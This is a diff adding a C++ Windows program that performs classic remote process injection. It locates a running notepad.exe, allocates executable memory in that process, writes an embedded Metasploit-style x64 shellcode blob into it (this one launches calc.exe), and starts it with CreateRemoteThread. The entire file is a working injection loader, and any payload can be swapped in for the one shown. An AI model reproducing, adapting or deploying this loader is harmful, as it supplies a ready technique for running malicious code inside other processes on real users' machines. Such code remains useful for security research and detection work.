@@ -1,0 +1,118 @@
+#pragma clang diagnostic push
+#pragma ide diagnostic ignored "bugprone-sizeof-expression"
+#include <windows.h>
+#include <psapi.h>
+#include <memoryapi.h>
+#include <cstdio>
+#include <ranges>
+
+void printError(DWORD id) {
+    DWORD size;
+    wchar_t * msg;
+    size = FormatMessageW(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM,
+                          nullptr,
+                          id,
+                          MAKELANGID(LANG_ENGLISH, SUBLANG_ENGLISH_US),
+                          (LPWSTR) &msg,
+                          0,
+                          nullptr);
+    printf("%lu\n", size);
+    printf("%ls\n", msg);
+    free(msg);
+    msg = nullptr;
+}
+
+BOOL CheckProcessNotepad(DWORD pid) {
+    TCHAR szProcessName[MAX_PATH] = TEXT("<unknown>");
+    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
+    if (hProcess != nullptr) {
+        HMODULE hMod = nullptr;
+        DWORD cbNeeded = 0;
+        if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded))
+            GetModuleBaseName(hProcess, hMod, szProcessName, sizeof(szProcessName)/sizeof(TCHAR));
+    }
+    CloseHandle(hProcess);
+    if (std::string_view(szProcessName).find("notepad.exe") != std::string::npos) return true;
+    else return false;
+}
+
+
+DWORD FindFirstNotepad() {
+    DWORD aProcesses[1024] = {0}, cbNeeded = 0, cProcesses = 0;
+    if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded)) return 0;
+    cProcesses = cbNeeded/sizeof(DWORD);
+    printf("[+] %lu processes found\n", cProcesses);
+    for (auto pid : aProcesses | std::views::take(cProcesses)) {
+        if (pid) {
+            if (CheckProcessNotepad(pid)) return pid;
+        }
+    }
+    return 0;
+}
+
+/*
+ * LPVOID VirtualAllocEx(
+ * [in]           HANDLE hProcess,
+ * [in, optional] LPVOID lpAddress,
+ * [in]           SIZE_T dwSize,
+ * [in]           DWORD  flAllocationType,
+ * [in]           DWORD  flProtect
+ * );
+ */
+
+int main() {
+    /* VARS */
+    DWORD notepadPid = 0, remotePid = 0;
+    HANDLE hNotepad, hRemote;
+    BOOL bWriteCheck = FALSE;
+    LPVOID lpAllocatedMemory = nullptr;
+    auto * lpBytesWritten = (SIZE_T*) malloc(sizeof(SIZE_T));
+    unsigned char shellcode[] =
+        "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
+        "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
+        "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
+        "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
+        "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
+        "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
+        "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
+        "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
+        "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
+        "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
+        "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
+        "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
+        "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
+        "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
+        "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
+        "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
+        "\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
+        "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
+        "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
+        "\xd5\x63\x6d\x64\x2e\x65\x78\x65\x20\x2f\x63\x20\x63\x61"
+        "\x6c\x63\x2e\x65\x78\x65\x00";
+    /* CODE */
+    size_t dShellcodeSize = sizeof(shellcode);
+    notepadPid = FindFirstNotepad();
+    if (notepadPid) {
+        printf("[+] First notepad.exe found with PID: %lu\n", notepadPid);
+        hNotepad = OpenProcess(PROCESS_ALL_ACCESS, FALSE, notepadPid);
+        if (hNotepad == nullptr) {
+            printError(GetLastError());
+            return EXIT_FAILURE;
+        }
+        lpAllocatedMemory = VirtualAllocEx(hNotepad, nullptr, dShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+        if (lpAllocatedMemory == nullptr) printError(GetLastError());
+        bWriteCheck = WriteProcessMemory(hNotepad, lpAllocatedMemory, &shellcode, dShellcodeSize, lpBytesWritten);
+        printf("[+] Bytes to write: %zu | Bytes written: %llu\n",dShellcodeSize, *lpBytesWritten);
+        if (!bWriteCheck) printError(GetLastError());
+        else printf("[+] Payload injected\n");
+        hRemote = CreateRemoteThread(hNotepad, nullptr, 0, (LPTHREAD_START_ROUTINE) lpAllocatedMemory, nullptr, 0, &remotePid);
+        if (hRemote == nullptr) printError(GetLastError());
+        else {
+            printf("[+] Remote thread executed with pid %lu\n", remotePid);
+        }
+        CloseHandle(hRemote);
+        CloseHandle(hNotepad);
+    }
+    else printf("[!] No notepad.exe process found on system\n");
+    return EXIT_SUCCESS;
+}
